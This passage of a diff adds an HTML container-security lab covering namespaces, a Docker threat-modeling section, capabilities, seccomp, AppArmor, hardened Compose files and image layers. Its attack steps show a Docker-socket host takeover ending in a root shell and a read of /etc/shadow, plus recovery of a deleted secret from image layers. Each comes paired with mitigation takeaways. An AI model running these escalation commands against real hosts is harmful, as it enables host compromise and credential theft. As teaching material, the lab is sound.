+<td><code>--ipc</code></td>
+<td>Isolate System V IPC</td>
+</tr>
+<tr>
+<td><code>--net</code></td>
+<td>Isolate network</td>
+</tr>
+<tr>
+<td><code>--pid</code></td>
+<td>Isolate process tree (you're PID 1 here)</td>
+</tr>
+<tr>
+<td><code>--fork</code></td>
+<td>Fork a new process in that namespace</td>
+</tr>
+<tr>
+<td><code>chroot ~/sandbox/rootfs</code></td>
+<td>Changes root to the fake root</td>
+</tr>
+<tr>
+<td><code>/bin/sh</code></td>
+<td>Starts a shell inside</td>
+</tr>
+</tbody>
+</table>
+<p>You're now inside a lightweight container. First, set the PATH since the environment is minimal:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">export</span> PATH=/bin
+</div></code></pre>
+<p><strong>6. Mount <code>/proc</code>:</strong></p>
+<p>Without this, commands like <code>ps</code> or <code>top</code> won't work. This provides the <code>/proc</code> pseudo-filesystem which reports process info.</p>
+<pre class="hljs"><code><div>mount -t proc proc /proc
+</div></code></pre>
+<p>Now try running some commands:</p>
+<pre class="hljs"><code><div>ps
+hostname
+<span class="hljs-built_in">id</span>
+<span class="hljs-built_in">uname</span> -a
+</div></code></pre>
+<p><strong>7. Cleanup:</strong></p>
+<p>Exit the chroot:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">exit</span>
+</div></code></pre>
+<p>Since we used <code>--mount</code> (a separate mount namespace), the <code>/proc</code> mount is automatically cleaned up when the namespace is destroyed — no need to manually unmount.</p>
+<hr>
+<h2 id="part-2-containers-threat-modeling-and-attack-surface">Part 2: Containers Threat Modeling and Attack Surface</h2>
+<h3 id="run-a-vulnerable-container">Run a vulnerable container</h3>
+<pre class="hljs"><code><div>docker run -it --<span class="hljs-built_in">rm</span> --name vuln --privileged debian bash
+</div></code></pre>
+<p>Install and start an SSH server inside the container:</p>
+<pre class="hljs"><code><div>apt update &amp;&amp; apt install openssh-server -y
+service ssh start
+</div></code></pre>
+<p>From the host, port scan the container:</p>
+<pre class="hljs"><code><div>nmap $(docker inspect -f <span class="hljs-string">&#x27;{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}&#x27;</span> vuln)
+</div></code></pre>
+<h3 id="simulate-privilege-escalation-with-host-mounts">Simulate privilege escalation with host mounts</h3>
+<p><strong>Privileged Mode:</strong> <code>--privileged</code> grants the container access to all host devices.</p>
+<p><strong>Host Mounts:</strong> Mounting <code>/</code> into a container allows full host access.</p>
+<pre class="hljs"><code><div>docker run -v /:/mnt -it debian bash
+<span class="hljs-built_in">ls</span> /mnt/root
+</div></code></pre>
+<h3 id="docker-socket-attack">Docker socket attack</h3>
+<p>The Docker socket (<code>/var/run/docker.sock</code>) is the API endpoint that the Docker CLI uses to communicate with the Docker daemon. If you mount it into a container, that container can control Docker on the host — including creating new privileged containers, accessing the host filesystem, or even replacing running containers.</p>
+<p>This is one of the <strong>most common real-world misconfigurations</strong>. Many CI/CD tools, monitoring agents, and deployment tools request socket access, and granting it is equivalent to giving root on the host.</p>
+<p><strong>1. Mount the Docker socket into a container:</strong></p>
+<pre class="hljs"><code><div>docker run -v /var/run/docker.sock:/var/run/docker.sock -it docker sh
+</div></code></pre>
+<p>You're now inside a container that has the <code>docker</code> CLI and access to the host's Docker daemon.</p>
+<p><strong>2. From inside the container, take over the host:</strong></p>
+<pre class="hljs"><code><div>docker run -v /:/host -it alpine <span class="hljs-built_in">chroot</span> /host
+</div></code></pre>
+<p>You now have a <strong>root shell on the host</strong> — you can read <code>/etc/shadow</code>, install packages, modify systemd services, etc. All from inside what was supposed to be an isolated container.</p>
+<p><strong>3. Verify host access:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">cat</span> /etc/hostname
+<span class="hljs-built_in">cat</span> /etc/shadow
+<span class="hljs-built_in">ls</span> /root
+<span class="hljs-built_in">exit</span>
+<span class="hljs-built_in">exit</span>
+</div></code></pre>
+<blockquote>
+<p><strong>Takeaway:</strong> Never mount the Docker socket into a container unless absolutely necessary. If you must (e.g., for CI/CD), use read-only mounts (<code>-v /var/run/docker.sock:/var/run/docker.sock:ro</code>) and restrict the container's capabilities. Better alternatives include using Docker's TCP API with TLS mutual authentication, or tools like <a href="https://github.com/nestybox/sysbox">Sysbox</a> that provide Docker-in-Docker without socket access.</p>
+</blockquote>
+<h3 id="lab-attackers-mindset-with-amicontained">Lab: Attacker's Mindset with amicontained</h3>
+<p><code>amicontained</code> is a tool that shows you the runtime security configuration of a container from the inside -- capabilities, namespaces, seccomp status, and more.</p>
+<h4 id="step-1-run-in-a-default-container">Step 1: Run in a default container</h4>
+<pre class="hljs"><code><div>docker run --<span class="hljs-built_in">rm</span> jess/amicontained amicontained
+</div></code></pre>
+<p>Observe the output:</p>
+<ul>
+<li>Which capabilities are granted?</li>
+<li>Is seccomp filtering active?</li>
+<li>Which namespaces are enabled?</li>
+</ul>
+<h4 id="step-2-run-in-a-privileged-container">Step 2: Run in a privileged container</h4>
+<pre class="hljs"><code><div>docker run --<span class="hljs-built_in">rm</span> --privileged jess/amicontained amicontained
+</div></code></pre>
+<p>Compare with Step 1:</p>
+<ul>
+<li>Notice that <strong>all capabilities</strong> are now granted</li>
+<li>Seccomp is <strong>disabled</strong></li>
+<li>Additional devices and host resources are accessible</li>
+</ul>
+<h4 id="step-3-run-in-a-hardened-container">Step 3: Run in a hardened container</h4>
+<pre class="hljs"><code><div>docker run --<span class="hljs-built_in">rm</span> \
+  --cap-drop=ALL \
+  --cap-add=NET_BIND_SERVICE \
+  --security-opt=no-new-privileges \
+  --read-only \
+  --user 1000:1000 \
+  jess/amicontained amicontained
+</div></code></pre>
+<p>Compare with Steps 1 and 2:</p>
+<ul>
+<li>Only <code>NET_BIND_SERVICE</code> capability remains</li>
+<li>Seccomp is <strong>active</strong></li>
+<li><code>no-new-privileges</code> prevents privilege escalation</li>
+</ul>
+<h4 id="step-4-compare-side-by-side">Step 4: Compare side by side</h4>
+<p>Create a simple comparison table from your observations:</p>
+<table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>Default</th>
+<th>Privileged</th>
+<th>Hardened</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Capabilities</td>
+<td>~14 default</td>
+<td>ALL (40+)</td>
+<td>1 (NET_BIND_SERVICE)</td>
+</tr>
+<tr>
+<td>Seccomp</td>
+<td>Enabled (default profile)</td>
+<td>Disabled</td>
+<td>Enabled (default profile)</td>
+</tr>
+<tr>
+<td>no-new-privileges</td>
+<td>No</td>
+<td>No</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Namespaces</td>
+<td>pid, net, mnt, uts, ipc</td>
+<td>pid, net, mnt, uts, ipc</td>
+<td>pid, net, mnt, uts, ipc</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Takeaway:</strong> A default container is not secure. A privileged container is wide open. Always harden your containers by dropping capabilities and enabling security options.</p>
+</blockquote>
+<hr>
+<h2 id="part-3-runtime-hardening">Part 3: Runtime Hardening</h2>
+<h3 id="capabilities">Capabilities</h3>
+<p>Traditionally, Linux divided processes into two categories: <strong>privileged</strong> (UID 0 / root) with full access, and <strong>unprivileged</strong> (everyone else). This all-or-nothing model is dangerous — if a process needs just one root power (e.g., binding to port 80), it gets <em>all</em> root powers.</p>
+<p><strong>Linux capabilities</strong> break root privileges into ~40 distinct units. Each capability grants a specific power:</p>
+<table>
+<thead>
+<tr>
+<th>Capability</th>
+<th>What it allows</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>CAP_NET_BIND_SERVICE</code></td>
+<td>Bind to ports below 1024</td>
+</tr>
+<tr>
+<td><code>CAP_SYS_ADMIN</code></td>
+<td>Mount filesystems, configure namespaces, etc. (the &quot;new root&quot;)</td>
+</tr>
+<tr>
+<td><code>CAP_NET_RAW</code></td>
+<td>Use raw sockets (ping, packet sniffing)</td>
+</tr>
+<tr>
+<td><code>CAP_SYS_PTRACE</code></td>
+<td>Trace/debug other processes</td>
+</tr>
+<tr>
+<td><code>CAP_DAC_OVERRIDE</code></td>
+<td>Bypass file read/write/execute permission checks</td>
+</tr>
+<tr>
+<td><code>CAP_CHOWN</code></td>
+<td>Change file ownership</td>
+</tr>
+<tr>
+<td><code>CAP_KILL</code></td>
+<td>Send signals to any process</td>
+</tr>
+<tr>
+<td><code>CAP_SETUID</code> / <code>CAP_SETGID</code></td>
+<td>Change process UID/GID</td>
+</tr>
+</tbody>
+</table>
+<p>Docker grants ~14 capabilities by default — enough for most applications but far less than full root. The principle of <strong>least privilege</strong> says: drop all capabilities, then add back only what your application needs.</p>
+<p>Capabilities are tracked in three sets:</p>
+<ul>
+<li><strong>Bounding set</strong> — upper limit of capabilities the process can ever gain</li>
+<li><strong>Effective set</strong> — capabilities currently active</li>
+<li><strong>Permitted set</strong> — capabilities the process is allowed to activate</li>
+</ul>
+<p><strong>View default capabilities:</strong></p>
+<pre class="hljs"><code><div>docker run --<span class="hljs-built_in">rm</span> alpine sh -c <span class="hljs-string">&quot;apk add --no-cache libcap-utils &amp;&amp; capsh --print&quot;</span>
+</div></code></pre>
+<p>You'll see ~14 capabilities are granted by default including <code>cap_chown</code>, <code>cap_dac_override</code>, <code>cap_fowner</code>, <code>cap_kill</code>, <code>cap_setgid</code>, <code>cap_setuid</code>, <code>cap_net_bind_service</code>, <code>cap_net_raw</code>, <code>cap_sys_chroot</code>, <code>cap_mknod</code>, <code>cap_audit_write</code>, <code>cap_setfcap</code>.</p>
+<p><strong>Drop all capabilities:</strong></p>
+<pre class="hljs"><code><div>docker run --<span class="hljs-built_in">rm</span> --cap-drop=ALL alpine sh -c <span class="hljs-string">&quot;apk add --no-cache libcap-utils &amp;&amp; capsh --print&quot;</span>
+</div></code></pre>
+<p>Now <code>Current:</code> and <code>Bounding set</code> will be empty — all capabilities are removed.</p>
+<p><strong>Add back only what's needed:</strong></p>
+<pre class="hljs"><code><div>docker run --<span class="hljs-built_in">rm</span> --cap-drop=ALL --cap-add=NET_BIND_SERVICE alpine sh
+</div></code></pre>
+<h3 id="seccomp">Seccomp</h3>
+<p><strong>Seccomp</strong> (Secure Computing Mode) is a Linux kernel feature that filters which <strong>system calls</strong> a process can make. Since every interaction with the kernel goes through syscalls (<code>read</code>, <code>write</code>, <code>open</code>, <code>execve</code>, <code>mount</code>, <code>ptrace</code>, etc.), restricting them is a powerful defense layer.</p>
+<p>There are two modes:</p>
+<ul>
+<li><strong>Strict mode</strong> — only allows <code>read</code>, <code>write</code>, <code>exit</code>, and <code>sigreturn</code>. Almost nothing works.</li>
+<li><strong>Filter mode</strong> (seccomp-bpf) — uses BPF programs to allow/deny specific syscalls. This is what Docker uses.</li>
+</ul>
+<p>Docker applies a <strong>default seccomp profile</strong> that blocks ~60 dangerous syscalls out of ~300+ total, including:</p>
+<table>
+<thead>
+<tr>
+<th>Blocked syscall</th>
+<th>Risk if allowed</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>mount</code> / <code>umount</code></td>
+<td>Mount host filesystems from inside the container</td>
+</tr>
+<tr>
+<td><code>reboot</code></td>
+<td>Reboot the host</td>
+</tr>
+<tr>
+<td><code>kexec_load</code></td>
+<td>Load a new kernel</td>
+</tr>
+<tr>
+<td><code>ptrace</code></td>
+<td>Debug/inspect other processes</td>
+</tr>
+<tr>
+<td><code>personality</code></td>
+<td>Change execution domain (used in exploits)</td>
+</tr>
+<tr>
+<td><code>unshare</code></td>
+<td>Create new namespaces (container escape)</td>
+</tr>
+</tbody>
+</table>
+<p>You can create <strong>custom profiles</strong> to further restrict or relax the defaults. Profiles are JSON files that specify an action per syscall.</p>
+<blockquote>
+<p><strong>Capabilities vs Seccomp:</strong> Capabilities control <em>what privileges</em> a process has. Seccomp controls <em>what kernel functions</em> it can call. They are complementary — use both for defense in depth.</p>
+</blockquote>
+<p><strong>1. Create a seccomp profile:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">cat</span> &gt; seccomp.json &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span>
+{
+    <span class="hljs-string">&quot;defaultAction&quot;</span>: <span class="hljs-string">&quot;SCMP_ACT_ALLOW&quot;</span>,
+    <span class="hljs-string">&quot;syscalls&quot;</span>: [
+        {
+            <span class="hljs-string">&quot;names&quot;</span>: [<span class="hljs-string">&quot;ptrace&quot;</span>],
+            <span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;SCMP_ACT_ERRNO&quot;</span>
+        }
+    ]
+}
+EOF
+</div></code></pre>
+<p>This profile allows all syscalls by default but <strong>blocks <code>ptrace</code></strong> — used by <code>strace</code> and debuggers. Blocking it prevents processes from inspecting or modifying the behavior of other processes.</p>
+<p><strong>2. Run a container with the profile:</strong></p>
+<pre class="hljs"><code><div>docker run --<span class="hljs-built_in">rm</span> --security-opt seccomp=seccomp.json alpine sh -c <span class="hljs-string">&quot;apk add --no-cache strace &amp;&amp; strace -e open ls&quot;</span>
+</div></code></pre>
+<p><code>strace</code> will fail because <code>ptrace</code> is blocked.</p>
+<h3 id="apparmor">AppArmor</h3>
+<p><strong>AppArmor</strong> (Application Armor) is a Linux Security Module (LSM) that restricts what individual programs can do — which files they can read/write, which network operations they can perform, and which capabilities they can use. It works alongside capabilities and seccomp as an additional layer of defense.</p>
+<p><strong>How it works:</strong></p>
+<ul>
+<li>AppArmor uses <strong>profiles</strong> — text files that define access rules for a specific program</li>
+<li>Profiles are loaded into the kernel and enforced at the LSM level</li>
+<li>Each profile can be in one of two modes:
+<ul>
+<li><strong>Enforce</strong> — violations are blocked and logged</li>
+<li><strong>Complain</strong> — violations are logged but allowed (useful for profile development)</li>
+</ul>
+</li>
+</ul>
+<p><strong>AppArmor vs SELinux:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>AppArmor</th>
+<th>SELinux</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Model</td>
+<td>Path-based (rules reference file paths)</td>
+<td>Label-based (rules reference security labels)</td>
+</tr>
+<tr>
+<td>Complexity</td>
+<td>Simpler to write and understand</td>
+<td>More powerful but steeper learning curve</td>
+</tr>
+<tr>
+<td>Default on</td>
+<td>Ubuntu, Debian, SUSE</td>
+<td>RHEL, Fedora, CentOS</td>
+</tr>
+<tr>
+<td>Profile scope</td>
+<td>Per-program</td>
+<td>System-wide mandatory access control</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Docker and AppArmor:</strong> Docker automatically applies a default AppArmor profile (<code>docker-default</code>) to all containers. This profile prevents containers from writing to <code>/proc</code> and <code>/sys</code>, loading kernel modules, mounting filesystems, and accessing raw sockets. You can override it with custom profiles using <code>--security-opt apparmor=&lt;profile-name&gt;</code>.</p>
+<blockquote>
+<p><strong>Defense in depth:</strong> Capabilities limit <em>what powers</em> a process has. Seccomp limits <em>what syscalls</em> it can make. AppArmor limits <em>what resources</em> (files, network, etc.) it can access. Together, they form three complementary layers of runtime hardening.</p>
+</blockquote>
+<p><strong>1. Install AppArmor:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> apt install apparmor apparmor-profiles apparmor-utils
+<span class="hljs-built_in">sudo</span> apparmor_status
+</div></code></pre>
+<p><strong>2. Create a test script (<code>test.sh</code>):</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">cat</span> &gt; test.sh &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span>
+<span class="hljs-comment">#!/bin/sh</span>
+<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;test&quot;</span> &gt; /etc/testfile
+EOF
+<span class="hljs-built_in">chmod</span> +x test.sh
+</div></code></pre>
+<p><strong>3. Create a Dockerfile (<code>apparmor.Dockerfile</code>):</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">cat</span> &gt; apparmor.Dockerfile &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span>
+FROM alpine
+COPY test.sh /test.sh
+RUN <span class="hljs-built_in">chmod</span> +x /test.sh
+CMD [<span class="hljs-string">&quot;/test.sh&quot;</span>]
+EOF
+docker build -t apparmor-test -f apparmor.Dockerfile .
+</div></code></pre>
+<p><strong>4. Create a restrictive AppArmor profile:</strong></p>
+<p>Save the following as <code>/etc/apparmor.d/docker-deny-write-etc</code>:</p>
+<pre class="hljs"><code><div>#include &lt;tunables/global&gt;
+
+/usr/bin/docker-default {
+  profile docker-deny-write-etc flags=(attach_disconnected) {
+    file,
+    network,
+    capability,
+
+    # Deny writing to /etc
+    deny /etc/** w,
+
+    # Required for Docker
+    mount,
+    signal,
+    ptrace,
+  }
+}
+</div></code></pre>
+<p><strong>Line-by-line explanation:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Line</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>#include &lt;tunables/global&gt;</code></td>
+<td>Includes global variable definitions (e.g., <code>@{HOME}</code>, <code>@{PROC}</code>). Standard boilerplate for all AppArmor profiles.</td>
+</tr>
+<tr>
+<td><code>/usr/bin/docker-default {</code></td>
+<td>The <strong>parent profile</strong> — this attaches to the Docker default binary path. It acts as a container for the nested child profile.</td>
+</tr>
+<tr>
+<td><code>profile docker-deny-write-etc</code></td>
+<td>Defines a <strong>named child profile</strong> called <code>docker-deny-write-etc</code>. This is the actual profile applied to the container.</td>
+</tr>
+<tr>
+<td><code>flags=(attach_disconnected)</code></td>
+<td>Allows the profile to work on processes whose namespace path is disconnected from the initial namespace — <strong>required for Docker containers</strong> because they run in separate mount namespaces. Without this flag, AppArmor would refuse to confine the container.</td>
+</tr>
+<tr>
+<td><code>file,</code></td>
+<td>Grants <strong>all file operations</strong> by default (read, write, execute, create, delete). Specific <code>deny</code> rules below override this.</td>
+</tr>
+<tr>
+<td><code>network,</code></td>
+<td>Allows <strong>all network operations</strong> (TCP, UDP, raw sockets, etc.).</td>
+</tr>
+<tr>
+<td><code>capability,</code></td>
+<td>Allows <strong>all Linux capabilities</strong>. The container's capabilities are already restricted by Docker — AppArmor doesn't need to duplicate that.</td>
+</tr>
+<tr>
+<td><code>deny /etc/** w,</code></td>
+<td><strong>Explicitly denies</strong> write access to anything under <code>/etc/</code>. The <code>**</code> glob matches all files and subdirectories recursively. The <code>w</code> permission means write. <code>deny</code> rules always take precedence over allow rules — even though <code>file,</code> allows everything, this blocks <code>/etc/</code> writes.</td>
+</tr>
+<tr>
+<td><code>mount,</code></td>
+<td>Allows mount operations — needed by Docker for setting up the container's filesystem (overlay mounts, <code>/proc</code>, <code>/dev</code>, etc.).</td>
+</tr>
+<tr>
+<td><code>signal,</code></td>
+<td>Allows sending and receiving signals — needed for Docker to manage container processes (<code>SIGTERM</code>, <code>SIGKILL</code>, etc.).</td>
+</tr>
+<tr>
+<td><code>ptrace,</code></td>
+<td>Allows process tracing — needed by Docker for process management and health checks.</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Key concept:</strong> AppArmor uses a <strong>default-deny with explicit allows</strong> or <strong>default-allow with explicit denies</strong> model. This profile uses the latter — it allows everything (<code>file, network, capability</code>) and then specifically denies writing to <code>/etc/</code>. The <code>deny</code> keyword is special: it <strong>always wins</strong> over allow rules and cannot be overridden.</p>
+</blockquote>
+<p>You can download it:</p>
+<pre class="hljs"><code><div>wget https://raw.githubusercontent.com/tsadimasteaching/efrei/refs/heads/main/docker-deny-write-etc
+<span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cp</span> docker-deny-write-etc /etc/apparmor.d/
+</div></code></pre>
+<p><strong>5. Load and test the profile:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> mount -t securityfs securityfs /sys/kernel/security
+<span class="hljs-built_in">sudo</span> apparmor_parser -r /etc/apparmor.d/docker-deny-write-etc
+<span class="hljs-built_in">sudo</span> apparmor_status
+</div></code></pre>
+<p><strong>6. Run the container with AppArmor enforcement:</strong></p>
+<pre class="hljs"><code><div>docker run --<span class="hljs-built_in">rm</span> -it --security-opt apparmor:/usr/bin/docker-default//docker-deny-write-etc apparmor-test
+</div></code></pre>
+<p>The write to <code>/etc/testfile</code> will be <strong>denied</strong> by AppArmor.</p>
+<h3 id="hardening-docker-compose">Hardening Docker Compose</h3>
+<p>In production, most applications use Docker Compose. All the runtime hardening options from this section can be applied in <code>docker-compose.yaml</code>. This exercise creates a hardened Compose file for a simple web application.</p>
+<p><strong>1. Create a hardened <code>docker-compose.yaml</code>:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">cat</span> &gt; docker-compose-hardened.yaml &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span>
+services:
+  web:
+    image: nginx:alpine
+    ports:
+      - <span class="hljs-string">&quot;8080:80&quot;</span>
+    <span class="hljs-comment"># Drop all capabilities, add only what nginx needs</span>
+    cap_drop:
+      - ALL
+    cap_add:
+      - NET_BIND_SERVICE
+      - CHOWN
+      - SETGID
+      - SETUID
+    <span class="hljs-comment"># Read-only root filesystem</span>
+    read_only: <span class="hljs-literal">true</span>
+    <span class="hljs-comment"># Temp directories for nginx to write to</span>
+    tmpfs:
+      - /tmp
+      - /var/cache/nginx
+      - /var/run
+    <span class="hljs-comment"># Prevent privilege escalation</span>
+    security_opt:
+      - no-new-privileges:<span class="hljs-literal">true</span>
+    <span class="hljs-comment"># Resource limits</span>
+    deploy:
+      resources:
+        limits:
+          memory: 128M
+          cpus: <span class="hljs-string">&quot;0.5&quot;</span>
+        reservations:
+          memory: 64M
+    <span class="hljs-comment"># Limit number of processes (prevent fork bombs)</span>
+    pids_limit: 50
+    <span class="hljs-comment"># No access to host network</span>
+    networks:
+      - app-net
+
+networks:
+  app-net:
+    driver: bridge
+EOF
+</div></code></pre>
+<p><strong>2. Run and verify the hardened container:</strong></p>
+<pre class="hljs"><code><div>docker compose -f docker-compose-hardened.yaml up -d
+</div></code></pre>
+<p><strong>3. Verify the hardening is applied:</strong></p>
+<pre class="hljs"><code><div>docker inspect $(docker compose -f docker-compose-hardened.yaml ps -q web) | grep -A 5 CapDrop
+docker <span class="hljs-built_in">exec</span> $(docker compose -f docker-compose-hardened.yaml ps -q web) sh -c <span class="hljs-string">&quot;touch /test&quot;</span> 2&gt;&amp;1 || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Read-only filesystem: PASS&quot;</span>
+curl -s http://localhost:8080 | <span class="hljs-built_in">head</span> -5
+</div></code></pre>
+<p><strong>4. Compare with an unhardened version:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Setting</th>
+<th>Unhardened (default)</th>
+<th>Hardened</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Capabilities</td>
+<td>~14 default</td>
+<td>Only NET_BIND_SERVICE + 3</td>
+</tr>
+<tr>
+<td>Filesystem</td>
+<td>Read-write</td>
+<td>Read-only + tmpfs</td>
+</tr>
+<tr>
+<td>Memory limit</td>
+<td>Unlimited</td>
+<td>128MB</td>
+</tr>
+<tr>
+<td>CPU limit</td>
+<td>Unlimited</td>
+<td>0.5 cores</td>
+</tr>
+<tr>
+<td>PID limit</td>
+<td>Unlimited</td>
+<td>50</td>
+</tr>
+<tr>
+<td>Privilege escalation</td>
+<td>Allowed</td>
+<td>Blocked</td>
+</tr>
+</tbody>
+</table>
+<p><strong>5. Cleanup:</strong></p>
+<pre class="hljs"><code><div>docker compose -f docker-compose-hardened.yaml down
+</div></code></pre>
+<blockquote>
+<p><strong>Takeaway:</strong> Always apply security options in your Compose files. In production, treat <code>docker-compose.yaml</code> as a security policy — every service should have <code>cap_drop: [ALL]</code>, <code>read_only: true</code>, <code>security_opt: [no-new-privileges:true]</code>, and resource limits.</p>
+</blockquote>
+<hr>
+<h2 id="part-4-secure-image-build-and-scanning">Part 4: Secure Image Build and Scanning</h2>
+<h3 id="understanding-overlayfs-dockers-storage-driver">Understanding OverlayFS (Docker's Storage Driver)</h3>
+<p>Docker uses <strong>overlay2</strong> as its default storage driver, built on the Linux kernel's <strong>OverlayFS</strong> — a union filesystem that merges multiple directory layers into a single view:</p>
+<ul>
+<li><strong>Lower layers</strong> (read-only): each <code>RUN</code>, <code>COPY</code>, <code>ADD</code> instruction in a Dockerfile creates a new layer</li>
+<li><strong>Upper layer</strong> (read-write): per-container; writes use <strong>copy-on-write</strong> (CoW) — the file is copied from a lower layer before modification</li>
+<li><strong>Merged view</strong>: what the container actually sees as its filesystem</li>
+</ul>
+<p><strong>1. Check your storage driver:</strong></p>
+<pre class="hljs"><code><div>docker info | grep <span class="hljs-string">&quot;Storage Driver&quot;</span>
+</div></code></pre>
+<p><strong>2. Inspect image layers:</strong></p>
+<pre class="hljs"><code><div>docker pull nginx:alpine
+docker inspect nginx:alpine --format <span class="hljs-string">&#x27;{{json .RootFS.Layers}}&#x27;</span> | python3 -m json.tool
+</div></code></pre>
+<p>Each SHA256 hash is a layer. Layers are shared across containers using the same image.</p>
+<p><strong>3. See the overlay mount of a running container:</strong></p>
+<pre class="hljs"><code><div>docker run -d --name overlay-test alpine <span class="hljs-built_in">sleep</span> 300
+
+<span class="hljs-comment"># View the overlay mount details from inside the container</span>
+docker <span class="hljs-built_in">exec</span> overlay-test <span class="hljs-built_in">cat</span> /proc/1/mountinfo | <span class="hljs-built_in">head</span> -1
+</div></code></pre>
+<p>You'll see a line like:</p>
+<pre class="hljs"><code><div>... / rw,relatime - overlay overlay rw,lowerdir=.../snapshots/412/fs:.../snapshots/179/fs,upperdir=.../snapshots/413/fs,...
+</div></code></pre>
+<p>This shows the <strong>lowerdir</strong> (read-only image layers), <strong>upperdir</strong> (container's writable layer), and <strong>workdir</strong> (internal bookkeeping).</p>
+<pre class="hljs"><code><div><span class="hljs-comment"># Write a file and observe that it only exists in the container layer</span>
+docker <span class="hljs-built_in">exec</span> overlay-test sh -c <span class="hljs-string">&quot;echo hello &gt; /test.txt&quot;</span>
+docker <span class="hljs-built_in">exec</span> overlay-test <span class="hljs-built_in">cat</span> /test.txt
+
+<span class="hljs-comment"># The file lives in the upper (writable) layer — image layers are untouched</span>
+docker diff overlay-test
+</div></code></pre>
+<p><code>docker diff</code> shows <code>A /test.txt</code> (Added) — confirming the write went only to the container's upper layer.</p>
+<p><strong>4. Demonstrate layer leaking (secrets persist in layers):</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">cat</span> &gt; layer-leak.Dockerfile &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span>
+FROM alpine
+RUN <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;DB_PASSWORD=supersecret&quot;</span> &gt; /secret.txt
+RUN <span class="hljs-built_in">rm</span> /secret.txt
+EOF
+docker build -t layer-leak -f layer-leak.Dockerfile .
+docker <span class="hljs-built_in">history</span> layer-leak
+</div></code></pre>
+<p>Even though <code>/secret.txt</code> was deleted, the layer that created it still exists. You can extract it:</p>
+<pre class="hljs"><code><div>docker save layer-leak -o layer-leak.tar
+<span class="hljs-built_in">mkdir</span> layer-leak-extracted &amp;&amp; tar -xf layer-leak.tar -C layer-leak-extracted
+
+<span class="hljs-comment"># List each layer&#x27;s contents — look for secret.txt</span>
+<span class="hljs-keyword">for</span> layer <span class="hljs-keyword">in</span> $(python3 -c <span class="hljs-string">&quot;
+import json
+m = json.load(open(&#x27;layer-leak-extracted/manifest.json&#x27;))
+[print(l) for l in m[0][&#x27;Layers&#x27;]]
+&quot;</span>); <span class="hljs-keyword">do</span>
+  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;=== <span class="hljs-variable">$layer</span> ===&quot;</span>
+  tar -tf <span class="hljs-string">&quot;layer-leak-extracted/<span class="hljs-variable">$layer</span>&quot;</span> | <span class="hljs-built_in">head</span> -5
+<span class="hljs-keyword">done</span>
+</div></code></pre>
+<p>You'll see <code>secret.txt</code> in one layer and <code>.wh.secret.txt</code> (the whiteout marker) in the next. Extract the secret:</p>
+<pre class="hljs"><code><div><span class="hljs-comment"># Find which layer has the secret and extract it</span>
+<span class="hljs-keyword">for</span> layer <span class="hljs-keyword">in</span> $(python3 -c <span class="hljs-string">&quot;
+import json; m = json.load(open(&#x27;layer-leak-extracted/manifest.json&#x27;))
+[print(l) for l in m[0][&#x27;Layers&#x27;]]
+&quot;</span>); <span class="hljs-keyword">do</span>
+  tar -tf <span class="hljs-string">&quot;layer-leak-extracted/<span class="hljs-variable">$layer</span>&quot;</span> 2&gt;/dev/null | grep -q secret.txt &amp;&amp; \
+    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Found in: <span class="hljs-variable">$layer</span>&quot;</span> &amp;&amp; \
+    tar -xf <span class="hljs-string">&quot;layer-leak-extracted/<span class="hljs-variable">$layer</span>&quot;</span> -O secret.txt 2&gt;/dev/null
+<span class="hljs-keyword">done</span>
+</div></code></pre>
+<blockquote>
+<p><strong>Takeaway:</strong> Never put secrets in any Dockerfile layer — even if you delete them in a later layer, they remain in the image history. Use multi-stage builds, <code>.dockerignore</code>, or Docker secrets instead.</p>
+</blockquote>
+<p><strong>5. Cleanup:</strong></p>
+<pre class="hljs"><code><div>docker stop overlay-test &amp;&amp; docker <span class="hljs-built_in">rm</span> overlay-test
+docker rmi layer-leak
+<span class="hljs-built_in">rm</span> -rf layer-leak-extracted layer-leak.tar layer-leak.Dockerfile
+</div></code></pre>
+<h3 id="compare-ubuntu-vs-alpine-base-images">Compare Ubuntu vs Alpine base images</h3>
+<p><strong>Build a Ubuntu-based image (<code>mypythonubuntu.Dockerfile</code>):</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">cat</span> &gt; mypythonubuntu.Dockerfile &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span>
+FROM ubuntu
+RUN apt update -y &amp;&amp; apt install curl python3 -y
+EOF
+docker build -t mypythonubuntu -f mypythonubuntu.Dockerfile .
+</div></code></pre>
